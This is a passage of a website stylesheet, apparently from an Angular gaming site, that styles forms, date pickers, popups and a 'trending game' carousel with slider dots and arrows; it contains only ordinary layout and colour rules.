            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control::-moz-placeholder {
            color: #69707e
        }

        .form-control::-ms-input-placeholder {
            color: #69707e
        }

        .form-control::placeholder {
            color: #69707e
        }

        .header-text h3 {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame span {
                right: 10px
            }
            .header-text h3 {
                font-size: 1.5em
            }
        }

        .header-text h4 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium h3 {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small h3 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium h3,
            .header-text-small h3 {
                font-size: 1.5em
            }
        }

        .header-text-extra-small h3 {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small h3 {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold h3 {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text p {
            font-size: 1em;
            color: #fff
        }

        .radio-input {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft {
            float: left
        }

        .fright {
            float: right
        }

        .row .padding-left-0 {
            padding-left: 0
        }

        .form-group.form-group--media {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected {
            background: 0 0
        }

        .invalid-feedback {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle .shuffle-container {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle .shuffle-container>.row {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table {
            display: table
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item.img {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle .shuffle-container img {
            max-width: 100%
        }

        .popup-shuffle .shuffle-container p {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle .shuffle-container p strong {
            font-size: 1.09em
        }

        .mat-datepicker-content {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content {
            color: #fff
        }

        .mat-calendar-body-disabled>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label,
        .mat-calendar-table-header th,
        .mat-datepicker-content .mat-calendar-next-button,
        .mat-datepicker-content .mat-calendar-previous-button,
        .mat-datepicker-toggle,
        .mat-icon-button[disabled][disabled] {
            color: #fff
        }

        .mat-calendar-arrow {
            border-top-color: #fff
        }

        .mat-calendar-header {
            color: #fff
        }

        .cdk-keyboard-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .cdk-program-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-today:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected {
            background: #d0021b;
            box-shadow: none
        }

        .block-url {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary .mat-option.mat-selected:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel .mat-option {
            color: #797979
        }

        .ngx-editor-textarea div,
        .ngx-editor-textarea section {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea div img,
        .ngx-editor-textarea section img {
            width: 100% !important
        }

        .ngx-editor-textarea a {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea * {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea b {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea b * {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea td {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content {
                background-color: #000
            }
        }

        .d-absolute--center {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center img {
            width: 50px;
            opacity: .5
        }

        .rating.color-ok .star-container .star svg {
            fill: #fff42c !important
        }

        .rating.color-ok .star-container .star i {
            color: #979797 !important
        }

        .background-full {
            position: absolute;
            width: 100%;
            height: 532px;
            background-color: #1d1f23
        }

        .trending-game {
            background-color: #1d1f23;
            background-repeat: no-repeat;
            position: relative;
            padding: 50px 0
        }

        .trending-game .label-value {
            color: #fff;
            font-family: montserrat;
            font-weight: 600;
            margin-right: 10px
        }

        .trending-game .label-value.medium,
        .trending-game .rating.medium .label-value {
            font-size: 16px
        }

        .trending-game .shade {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%
        }

        .trending-game header {
            position: relative
        }

        .trending-game .header-title {
            display: flex;
            justify-content: center
        }

        .trending-game .header-title h3 {
            position: relative;
            font-family: Montserrat;
            font-size: 2.1em;
            font-weight: 600;
            color: #fff
        }

        .trending-game .tg-slider {
            margin-top: 30px;
            outline: 0;
            position: relative
        }

        .trending-game .tg-slider .slick-next,
        .trending-game .tg-slider .slick-prev {
            font-size: 0;
            border: 0;
            outline: 0;
            background-color: transparent;
            background-repeat: no-repeat;
            background-position: center;
            background-image: url(/.assets/.images/.icons/right-arrow.png);
            background-size: contain;
            width: 28px;
            height: 36px;
            position: absolute;
            top: 42%;
            transition: all .3s ease-in-out;
            z-index: 10;
            opacity: .7
        }

        @media (max-width:991px) {
            .trending-game .tg-slider .slick-next,
            .trending-game .tg-slider .slick-prev {
                top: 25%
            }
        }

        .trending-game .tg-slider .slick-next:focus,
        .trending-game .tg-slider .slick-next:hover,
        .trending-game .tg-slider .slick-prev:focus,
        .trending-game .tg-slider .slick-prev:hover {
            opacity: 1
        }

        .trending-game .tg-slider .slick-prev {
            left: 1%;
            transform: rotate(180deg);
            display: none !important
        }

        .trending-game .tg-slider .slick-next {
            right: 1%
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold h3 {
                font-size: 1em
            }
            .fleft {
                float: right
            }
            .fright {
                float: left
            }
            .popup-shuffle .shuffle-container .shuffle-pop-table {
                padding: 0 20px
            }
            .mat-datepicker-toggle button.mat-icon-button {
                top: auto;
                bottom: 7px
            }
            .trending-game {
                padding: 35px 0 25px;
                background-position-x: center
            }
            .trending-game .header-title h3 {
                font-size: 18px
            }
            .trending-game .tg-slider {
                margin-top: 20px
            }
            .trending-game .tg-slider .slick-dots {
                position: static !important
            }
        }

        .trending-game .tg-slider .slick-dots {
            position: absolute;
            top: -60px;
            right: 0;
            padding: 0;
            margin: 0
        }

        .trending-game .tg-slider .slick-dots li {
            display: block;
            float: left
        }

        .trending-game .tg-slider .slick-dots li button {
            border: none;
            background-color: #979797;
            font-size: 0;
            width: 36px;
            height: 2px;
            margin: 0 2px;
            padding: 0
        }

        .trending-game .tg-slider .slick-dots li.slick-active button {
            height: 4px;
            background-color: #d0021b
        }

        .trending-game .tg-slider .tg-items {
            position: relative
        }

        .trending-game .tg-slider .tg-items .caption-wrapper {
            position: absolute;
            width: 100%;
            top: 150px;
            transform: translateY(-50%)
        }

        @media (max-width:991px) {
            .trending-game .tg-slider .tg-items .caption-wrapper {
                position: static;
                top: unset;
                transform: unset;
                margin-bottom: 20px
            }
        }

        .trending-game .tg-slider .tg-items .caption-wrapper h3 {
            margin: 0;
            font-family: Montserrat-Bold;
            font-size: 2.9em;
            color: #fff;
            font-weight: 600;
            line-height: 1.4;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: block;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        @media (max-width:767px) {
            .trending-game .tg-slider .tg-items .caption-wrapper h3 {
                font-size: 18px
            }
        }

        .trending-game .tg-slider .tg-items .caption-wrapper p {
            margin: 10px 0 20px;
            font-family: Montserrat;
            font-size: 1em;
            color: #fff;
            line-height: 1.5
        }

        .trending-game .tg-slider .tg-items .caption-wrapper .cta {
            letter-spacing: 1.7px;
            font-family: Montserrat-Bold;
            color: #fff;
            text-decoration: none;
            text-transform: uppercase
        }

        .trending-game .tg-slider .tg-items .caption-wrapper .cta i {
            width: 18px;
            height: 18px;
            border-radius: 3px;
            background-color: #d0021b;
            vertical-align: middle;
            text-align: center;
            line-height: 18px;
            margin-left: 4px
        }

        .trending-game .tg-slider .tg-items .media-wrapper {
            cursor: pointer
        }

        .trending-game .tg-slider .tg-items .media-wrapper .shadow-card {
            bottom: 5px !important
        }

        .trending-game .tg-slider .tg-items .media-wrapper>img {
            width: 90%
        }

        .trending-game .trending-slider {
            max-height: 400px;
            display: none
        }

        .trending-game .trending-slider .slick-list {
            padding: 50px 0 !important
        }

        .trending-game .trending-slider .slick-slide {
            position: relative
        }

        .trending-game .trending-slider .slick-slide .media-wrapper {
            display: none;
            cursor: pointer
        }

        .trending-game .trending-slider .slick-slide .media-wrapper>img {
            width: 100%;
            height: 245px;
            border-radius: 4px;
            -o-object-fit: cover;
            object-fit: cover
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .caption {
            z-index: 2;
            transform: scale(.8);
            position: absolute;
            padding: 0 0 20px;
            bottom: 0
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .shadow-card {
            bottom: 5px !important
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .title {
            font-family: Montserrat;
            font-size: 18px;
            font-stretch: normal;
            font-style: normal;
            letter-spacing: normal;
            color: #fff;
            overflow: hidden;
            font-weight: 600;
            line-height: 1.5;
            letter-spacing: 1px;
            cursor: pointer;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 1;
            text-overflow: ellipsis
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .rating {
            justify-content: unset
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .rating #rating-style .label-value {
            color: #fff;
            font-size: 16px;
            font-family: montserrat;
            font-weight: 600;
            margin-right: 10px
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .rating #rating-style .star-container .star {
            height: 15px
        }

        @media (max-width:767px) {
            .trending-game .trending-slider .slick-slide .media-wrapper>img {
                height: 170px
            }
            .trending-game .trending-slider .slick-slide .media-wrapper .caption {
                transform: scale(.6)
            }
            .trending-game .trending-slider .slick-slide .media-wrapper .rating #rating-style .label-value {
                font-size: 12px
            }
            .trending-game .trending-slider .slick-slide .media-wrapper .rating #rating-style .star-container .star {
                height: 12px
            }
        }

        .trending-game .trending-slider .slick-slide .media-wrapper .date {
            text-transform: uppercase;
            font-family: Montserrat;
            font-size: 12px;
            font-weight: 400;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff
        }

        .trending-game .trending-slider .slick-center {
            transform: scale(1.3);
            -webkit-animation: .5s pulse;
            animation: .5s pulse;
            z-index: 3
        }

        .trending-game .trending-slider .slick-center .media-wrapper {
            cursor: pointer
        }

        .trending-game .trending-slider .slick-center .media-wrapper .caption {
            position: absolute;
            padding: 0 0 20px;
            bottom: 0;
            transform: scale(.8)
        }

        .trending-game .trending-slider .slick-center .media-wrapper .shadow-card {
            bottom: 5px !important
        }

        .trending-game .trending-slider .slick-center .media-wrapper .rating {
            justify-content: unset
        }

        .trending-game .trending-slider .slick-center .media-wrapper .rating #rating-style .label-value {
            color: #fff;
            font-size: 16px;
            font-family: montserrat;
            font-weight: 600;
            margin-right: 10px
        }

        .trending-game .trending-slider .slick-center .media-wrapper .rating #rating-style .star-container .star {
            height: 15px
        }

        .trending-game .trending-slider.slick-initialized {
            display: block
        }

        .trending-game .trending-slider.slick-initialized .slick-slide .media-wrapper {
            display: inline-block
        }

        @-webkit-keyframes pulse {
            0% {
                transform: scale(1)
            }
            100% {
                transform: scale(1.3)
            }
        }

        @keyframes pulse {
            0% {
                transform: scale(1)
            }
            100% {
                transform: scale(1.3)
            }
        }

        .trending-game .trending-slider .slick-arrow {
            width: 22px;
            height: 72px;
            position: absolute;
            top: 38%;
            outline: 0;
            border: none;
            border-radius: 4px;
            background-color: #d0021b;
            padding: 0;
            font-size: 0;
            background-repeat: no-repeat;
            background-image: url(/.assets/.images/.icons/right-arrow.png);
            background-size: 30%;
            background-position: center;
            cursor: pointer
        }

        .trending-game .trending-slider .slick-arrow.slick-prev {
            z-index: 2;
            left: 0;
            transform: rotate(180deg)
        }

        .trending-game .trending-slider .slick-arrow.slick-next {
            right: 0
        }

        .trending-game .trending-slider .slick-dots {
            position: relative;
            display: flex;
            justify-content: center;
            padding: 0;
            margin: 0
        }

        .trending-game .trending-slider .slick-dots li {
            display: block;
            float: left
        }

        .trending-game .trending-slider .slick-dots li button {
            border: none;
            background-color: #979797;
            font-size: 0;
            width: 36px;
            height: 2px;
            margin: 0 2px;
            padding: 0
        }

        .trending-game .trending-slider .slick-dots li.slick-active button {
            height: 4px;
            background-color: #d0021b
        }

        .trending-game .highlight-slider .slick-slide {
            padding: 0 5px
        }

        .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big {
            padding-bottom: calc(110% - 22px)
        }

        @media (max-width:767px) {
            .trending-game .trending-slider .slick-center .media-wrapper .caption {
                transform: scale(.6)
            }
            .trending-game .trending-slider .slick-center .media-wrapper .rating #rating-style .label-value {
                font-size: 12px
            }
            .trending-game .trending-slider .slick-center .media-wrapper .rating #rating-style .star-container .star {
                height: 12px;
                width: 15px
            }
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big {
                padding-bottom: calc(100% + 32px)
            }
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big .rating {
                justify-content: unset
            }
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big .rating #rating-style .label-value {
                color: #fff;
                font-size: 16px;
                font-family: montserrat;
                font-weight: 600;
                margin-right: 10px
            }
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big .rating #rating-style .star-container .star {
                height: 15px
            }
        }

        @media (max-width:767px) and (max-width:767px) {
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big .rating #rating-style .label-value {
                font-size: 12px
            }
            .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big .rating #rating-style .star-container .star {
                height: 12px;
                width: 15px
            }
        }

        .trending-game .highlight-slider .slick-slide .news-content__post.news-content__post--big h3 {
            font-size: 1em;
            width: 100%
        }

        @media (max-width:767px) {
            .trending-game .highlight-slider .slick-slider .slick-list {
                padding: 25px 50px !important
            }
        }

        .trending-game .highlight-slider .slick-slider .slick-list .slick-slide {
            position: relative;
            z-index: 1
        }

        .trending-game .highlight-slider .slick-slider .slick-list .slick-slide.slick-cloned {
            position: relative;
            z-index: 1;
            transform: scale(1)
        }

        .trending-game .highlight-slider .slick-slider .slick-list .slick-active {
            transform: scale(1.15);
            -webkit-animation: .5s pulseMobile;
            animation: .5s pulseMobile;
            z-index: 2
        }

        @-webkit-keyframes pulseMobile {
            0% {
                transform: scale(1)
            }
            100% {
                transform: scale(1.1)
            }
        }

        @keyframes pulseMobile {
            0% {
                transform: scale(1)
            }
            100% {
                transform: scale(1.1)
            }
        }

        .trending-game .highlight-slider .slick-dots {
            position: relative;
            display: flex;
            justify-content: center;
            padding: 0;
            margin: 0
        }

        .trending-game .highlight-slider .slick-dots li {
            display: block;
            float: left
        }

        .trending-game .highlight-slider .slick-dots li button {
            border: none;
            background-color: #979797;
            font-size: 0;
            width: 36px;
            height: 2px;
            margin: 0 2px;
            padding: 0
        }

        .trending-game .highlight-slider .slick-dots li.slick-active button {
            height: 4px;
            background-color: #d0021b
        }

        .trending-game .highlight-slider .news-content__post {
            width: 100%;
            position: relative;
            background-size: cover;
            background-position: top center;
            background-repeat: no-repeat;
            box-shadow: 2px 3px 10px rgba(0, 0, 0, .61)
        }

        .trending-game .highlight-slider .news-content__post>a {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 9
        }

        .trending-game .highlight-slider .news-content__post .caption {
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 20px;
            z-index: 9
        }

        .trending-game .highlight-slider .news-content__post h3 {
            width: 85%;
            margin: 0;
            font-family: Montserrat-Bold;
            font-size: 2.9em;
            color: #fff;
            font-weight: 600;
            line-height: 1.4;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        @media (max-width:767px) {
            .trending-game .highlight-slider .news-content__post h3 {
                font-size: 18px
            }
        }

        .trending-game .highlight-slider .news-content__post p {
            width: 90%;
            margin: 10px 0 0;
            font-family: Montserrat;
            font-size: 1em;
            color: #fff;
            line-height: 1.5
        }

        .trending-game .highlight-slider .news-content__post span i.fa.fa-calendar-check-o {
            font-size: 16px;
            margin-right: 6px
        }

        .trending-game .highlight-slider .news-content__post span.date {
            display: inline-block;
            padding: 4px 10px;
            margin-top: 10px;
            margin-right: 5px;
            overflow: hidden;
            border-radius: 5px;
            background: #161619;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .trending-game .highlight-slider .news-content__post span.date.style2 {
            background: 0 0;
            border-radius: 0;
            padding: 0;
            margin: 10px 0 0;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .trending-game .highlight-slider .news-content__post span.date,
            .trending-game .highlight-slider .news-content__post span.date.style2 {
                margin-top: 0
            }
        }

        .trending-game .highlight-slider .news-content__post span.default {
            display: inline-block;
            overflow: hidden;
            border-radius: 5px;
            margin: 5px 5px 5px 0;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .trending-game .highlight-slider .news-content__post span.default.style2 {
            margin: 10px 0 0 !important;
            padding: 0 10px 0 0;
            border-right: 1px solid #fff;
            border-radius: 0 !important;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        .trending-game .highlight-slider .news-content__post.news-content__post--big {
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(100% + 32px);
            overflow: hidden
        }

        .trending-game .highlight-slider .news-content__post.news-content__post--medium {
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(50% + 23px);
            overflow: hidden
        }

        .trending-game .highlight-slider .news-content__post.news-content__post--medium h3 {
            font-size: 1.3em
        }

        .trending-game .highlight-slider .news-content__post.news-content__post--small {
            margin-top: 20px;
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(100% - 10px);
            overflow: hidden
        }

        .trending-game .highlight-slider .news-content__post.news-content__post--small h3 {
            font-size: 1em
        }

        .trending-game .highlight-slider .news-content__post.small {
            margin-top: 16px;
            height: 273px
        }

        .trending-game .highlight-slider .news-content__post.small::before {
            background: rgba(206, 199, 236, 0);
            background: linear-gradient(to bottom, rgba(206, 199, 236, 0) 0, rgba(78, 61, 40, .14) 15%, rgba(27, 26, 44, .94) 100%)
        }

        .trending-game .highlight-slider .news-content__post.small .caption {
            cursor: pointer
        }

        .trending-game .highlight-slider .news-content__post.small .caption img {
            margin-left: auto;
            margin-right: auto;
            display: block;
            margin-bottom: 12px;
            width: 50px
        }

        .trending-game .highlight-slider .news-content__post.small .caption h3 {
            width: 100%;
            margin: 0;
            font-family: Montserrat-Bold;
            font-size: 1.53em;
            color: #fff;
            font-weight: 600;
            line-height: 1.4
        }

        .trending-game .highlight-slider .news-content__post.small .caption .default {
            display: inline-block;
            overflow: hidden;
            border-radius: 5px;
            margin: 5px 5px 5px 0;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .trending-game #d-trending--game .row {
            margin-left: -13px;
            margin-right: -13px
        }

        ::ng-deep .slick-cloned .media-wrapper {
            cursor: pointer
        }

        ::ng-deep .slick-cloned .media-wrapper .rating #rating-style .label-value {
            color: #fff;
            font-size: 16px;
            font-family: montserrat;
            font-weight: 600;
            margin-right: 10px
        }

        ::ng-deep .slick-cloned .media-wrapper .rating #rating-style .star-container .star {
            height: 15px
        }

        @media (max-width:767px) {
            ::ng-deep .slick-cloned .media-wrapper .rating #rating-style .star-container .star {
                height: 12px;
                width: 15px
            }
        }
    </style>
    <style>
        @charset "UTF-8";
        .justify-content-left[_ngcontent-gtc-c12] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c12] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c12] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c12] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c12] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c12] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c12] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c12] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c12] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c12] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c12] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c12] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c12] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c12] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c12] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c12] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c12] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c12] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c12] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c12] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c12] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c12] button.mat-icon-button[_ngcontent-gtc-c12] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c12] button.mat-icon-button[_ngcontent-gtc-c12] span.mat-button-wrapper[_ngcontent-gtc-c12],
        .mat-datepicker-toggle[_ngcontent-gtc-c12] button.mat-icon-button[_ngcontent-gtc-c12] span.mat-button-wrapper[_ngcontent-gtc-c12] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c12] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c12] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c12] i.fa-caret-down[_ngcontent-gtc-c12] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c12] input[type=text][_ngcontent-gtc-c12] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option.active[_ngcontent-gtc-c12] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] label[_ngcontent-gtc-c12] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] label[_ngcontent-gtc-c12]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] label[_ngcontent-gtc-c12]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] input[type=radio][_ngcontent-gtc-c12] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c12] .cust-option[_ngcontent-gtc-c12] ul.option-list[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] input[type=radio][_ngcontent-gtc-c12]:checked+label[_ngcontent-gtc-c12]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c12] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c12] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c12],
        label[_ngcontent-gtc-c12],
        ol[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12],
        table[_ngcontent-gtc-c12] td[_ngcontent-gtc-c12],
        table[_ngcontent-gtc-c12] th[_ngcontent-gtc-c12],
        ul[_ngcontent-gtc-c12] li[_ngcontent-gtc-c12] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c12],
        h2[_ngcontent-gtc-c12],
        h3[_ngcontent-gtc-c12],
        h4[_ngcontent-gtc-c12],
        h5[_ngcontent-gtc-c12],
        h6[_ngcontent-gtc-c12],
        p[_ngcontent-gtc-c12],
        span[_ngcontent-gtc-c12] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c12] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c12],
        textarea[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c12] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c12] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c12] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c12] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c12] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c12] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c12] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
